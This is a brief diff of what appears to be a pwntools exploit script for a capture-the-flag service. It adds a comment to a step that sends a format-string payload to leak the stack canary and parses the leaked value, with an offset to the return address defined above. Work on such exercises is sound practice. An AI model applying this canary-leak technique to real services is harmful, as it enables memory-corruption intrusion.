@@ -14,6 +14,7 @@ OFFSET_TO_RIP = 88
 p = remote("offsec.m0lecon.it", 13523)
 
 p.recvuntil(b'dear customer?\n')
+# use a format string to leak the canary. it has been found previously. it has been identified as usually it ends with 00.
 p.sendline(f"%{CANARY_IDX}$lx".encode())
 leak = p.recvline().strip()
 canary = int(leak, 16)
